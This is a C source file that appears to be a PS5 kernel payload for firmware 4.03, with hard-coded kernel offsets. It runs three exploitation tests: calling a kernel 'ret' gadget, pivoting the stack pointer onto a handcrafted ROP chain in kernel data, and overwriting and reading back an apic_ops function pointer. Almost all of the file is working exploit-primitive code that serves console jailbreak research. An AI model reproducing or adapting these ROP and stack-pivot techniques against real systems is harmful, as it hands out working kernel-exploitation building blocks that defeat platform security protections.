#include <stdint.h>

/*
 * PS5 Stack Pivot Test (kstuff payload)
 *
 * Three sequential tests — if a test crashes, the status marker
 * stays at 0xAAAA (in-progress), telling us exactly which step failed.
 *
 * Test 1: Call nop_ret in ktext via function pointer
 *         Verifies we can execute ktext gadgets from kernel thread.
 *
 * Test 2: Manual RSP pivot to kdata ROP chain
 *         Saves RSP, pivots to a buffer containing [nop_ret, nop_ret, resume_addr],
 *         chains through ktext ret instructions, returns to our code.
 *         Proves: kdata addresses work as ROP chain, ktext rets pop them.
 *
 * Test 3: Write to apic_ops[2] and read back
 *         Verifies the function pointer in kdata is writable.
 *         Restores original value immediately after.
 *
 * Output at kthread_args[0..63]:
 *   [0x00] uint32_t magic = 0x50495654 ("PIVT")
 *   [0x04] uint32_t num_tests = 3
 *   [0x08] uint64_t kdata_base
 *   [0x10] uint64_t ktext_base
 *   [0x18] uint64_t nop_ret_addr (for manual verification)
 *   [0x20] uint32_t test1_status  (0=not started, 0xAAAA=in progress, 1=pass)
 *   [0x24] uint32_t test2_status
 *   [0x28] uint64_t apic_ops2_original
 *   [0x30] uint64_t apic_ops2_readback
 *   [0x38] uint32_t test3_status
 *   [0x3c] uint32_t pad
 */

#define MAGIC_PIVT    0x50495654  /* "PIVT" */
#define STATUS_NONE   0x0000
#define STATUS_TRYING 0xAAAA
#define STATUS_PASS   0x0001

/* FW 4.03 offsets */
#define OFF_WRMSR_RET     (-0x9d20cc)
#define OFF_NOP_RET       (OFF_WRMSR_RET + 2)  /* ret instruction */
#define APIC_OPS_OFFSET   0x1934AC8             /* from ktext_base */

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

typedef struct __attribute__((packed)) {
    uint32_t magic;
    uint32_t num_tests;
    uint64_t kdata_base;
    uint64_t ktext_base;
    uint64_t nop_ret_addr;
    uint32_t test1_status;
    uint32_t test2_status;
    uint64_t apic_ops2_original;
    uint64_t apic_ops2_readback;
    uint32_t test3_status;
    uint32_t pad;
} test_result_t;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;

    /* nop_ret = wrmsr_ret + 2 = a single `ret` instruction in ktext */
    uint64_t nop_ret = kdata_base + OFF_NOP_RET;

    /* Write header (overwrites args buffer) */
    test_result_t* out = (test_result_t*)args;
    out->magic = MAGIC_PIVT;
    out->num_tests = 3;
    out->kdata_base = kdata_base;
    out->ktext_base = ktext_base;
    out->nop_ret_addr = nop_ret;
    out->test1_status = STATUS_NONE;
    out->test2_status = STATUS_NONE;
    out->test3_status = STATUS_NONE;
    out->apic_ops2_original = 0;
    out->apic_ops2_readback = 0;
    out->pad = 0;

    /* ════════════════════════════════════════════
     * TEST 1: Call nop_ret (ktext ret gadget)
     *
     * If nop_ret is truly a `ret` instruction, calling it
     * will immediately return. If the offset is wrong or
     * ktext isn't executable, we crash here.
     * ════════════════════════════════════════════ */
    out->test1_status = STATUS_TRYING;

    __asm__ volatile(
        "callq *%0\n\t"
        :
        : "r"(nop_ret)
        : "memory", "cc"
    );

    out->test1_status = STATUS_PASS;

    /* ════════════════════════════════════════════
     * TEST 2: Manual RSP pivot + ROP chain
     *
     * Build a 3-entry ROP chain in our output buffer:
     *   rop[0] = nop_ret    (ret → pops rop[1])
     *   rop[1] = nop_ret    (ret → pops rop[2])
     *   rop[2] = resume     (ret → back to our code)
     *
     * Then: save RSP → pivot RSP to chain → ret starts it.
     * If we arrive at resume label, the pivot worked.
     * ════════════════════════════════════════════ */
    out->test2_status = STATUS_TRYING;

    /* Place ROP chain at offset 0x800 in 4KB args buffer */
    uint64_t* rop = (uint64_t*)((uint8_t*)args + 0x800);
    rop[0] = nop_ret;
    rop[1] = nop_ret;
    /* rop[2] = resume address, filled by asm below */

    __asm__ volatile(
        /* Store resume address into rop[2] */
        "leaq 1f(%%rip), %%rax\n\t"
        "movq %%rax, 16(%[chain])\n\t"

        /* Save RSP in callee-saved register */
        "movq %%rsp, %%rbx\n\t"

        /* Stack pivot: RSP now points to our ROP chain in kdata */
        "movq %[chain], %%rsp\n\t"

        /* ret → pops rop[0] (nop_ret) → executes ktext ret
         *     → pops rop[1] (nop_ret) → executes ktext ret
         *     → pops rop[2] (resume)  → jumps to 1: below */
        "retq\n\t"

        /* Resume point — if we get here, the pivot worked */
        "1:\n\t"
        "movq %%rbx, %%rsp\n\t"
        :
        : [chain] "r"(rop)
        : "rax", "rbx", "memory", "cc"
    );

    out->test2_status = STATUS_PASS;

    /* ════════════════════════════════════════════
     * TEST 3: Write to apic_ops[2] and read back
     *
     * apic_ops table is in RW kdata. Slot 2 (xapic_mode)
     * is at apic_ops + 0x10. Write a test value, verify
     * the readback, then restore the original.
     * ════════════════════════════════════════════ */
    out->test3_status = STATUS_TRYING;

    volatile uint64_t* apic_slot2 =
        (volatile uint64_t*)(ktext_base + APIC_OPS_OFFSET + 0x10);

    uint64_t original = *apic_slot2;
    out->apic_ops2_original = original;

    /* Write test pattern and read back */
    *apic_slot2 = 0xDEADC0DE00C0FFEEULL;
    uint64_t readback = *apic_slot2;
    out->apic_ops2_readback = readback;

    /* Restore original immediately */
    *apic_slot2 = original;

    out->test3_status = (readback == 0xDEADC0DE00C0FFEEULL) ? STATUS_PASS : 0xFFFF;

    return 0;
}
